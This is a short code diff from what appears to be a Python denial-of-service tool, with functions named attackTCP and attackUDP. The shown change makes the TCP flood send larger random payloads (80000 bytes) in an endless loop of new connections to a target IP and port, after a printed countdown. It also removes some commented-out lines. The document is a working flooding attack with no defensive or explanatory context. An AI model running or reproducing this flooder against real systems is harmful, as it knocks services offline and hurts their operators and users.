@@ -14,20 +14,17 @@ def checkForTarget(ip, port):
         return False
 
 def attackTCP(ip, port):
-    countdown = 5
-    #sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    #bytes = random._urandom(47680)
+    countdown = 5 
     while countdown > 0:
         print("Attack Starting in " + str(countdown))
         countdown = countdown - 1
         time.sleep(0.5)
 
     while True:
-        bytes = random._urandom(47680)
+        bytes = random._urandom(80000)
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.connect((ip, int(port)))
         sock.sendall(bytes)
-        #s.sendto(bytes, (ip, int(port)))
         print ("Sent bytes" + " to " + ip + ", port: " + str(port))
 
 def attackUDP(ip):
